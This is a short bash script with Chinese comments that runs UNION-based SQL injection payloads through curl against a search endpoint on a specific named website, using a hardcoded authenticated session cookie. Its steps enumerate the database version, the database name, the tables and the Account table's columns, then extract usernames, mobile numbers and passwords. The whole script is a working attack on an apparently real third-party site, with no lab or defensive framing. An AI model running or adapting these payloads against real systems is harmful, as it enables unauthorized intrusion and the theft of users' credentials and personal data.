#!/bin/bash
# SQL注入关键Payload测试脚本

BASE_URL="https://emsone.com.vn"
COOKIE=".ASPXAUTH=9AAABD844D8ABA71893548D13D33B45092F571D605F9C3D5E0F87CF8B5BBFF116A69590DBEA1BFA21CF8AA82B308834B1A0E6A8FC47784CC0F31BA76A62FBA23D9D8820D29C57246824D69334BF119CAA2285596253A28E92BD2395FE913BA9A; panelIdCookie=UserID=Yt/XwV1vLYyf+rVijGyCDA==; ASP.NET_SessionId=ulvtcuqlb3rxfdjs2rljcors"

echo "[*] 测试数据库版本"
curl -k -s "${BASE_URL}/Handle/SearchListProvince?Type=1' UNION SELECT version()--" \
  -H "Cookie: ${COOKIE}" | head -20

echo -e "\n[*] 测试数据库名"
curl -k -s "${BASE_URL}/Handle/SearchListProvince?Type=1' UNION SELECT database()--" \
  -H "Cookie: ${COOKIE}" | head -20

echo -e "\n[*] 提取所有表名"
curl -k -s "${BASE_URL}/Handle/SearchListProvince?Type=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--" \
  -H "Cookie: ${COOKIE}" | head -20

echo -e "\n[*] 提取Account表列名"
curl -k -s "${BASE_URL}/Handle/SearchListProvince?Type=1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='Account'--" \
  -H "Cookie: ${COOKIE}" | head -20

echo -e "\n[*] 提取用户凭证（前10条）"
curl -k -s "${BASE_URL}/Handle/SearchListProvince?Type=1' UNION SELECT CONCAT(ID,':',UserName,':',MobileNumber,':',Password) FROM Account LIMIT 0,10--" \
  -H "Cookie: ${COOKIE}" | head -20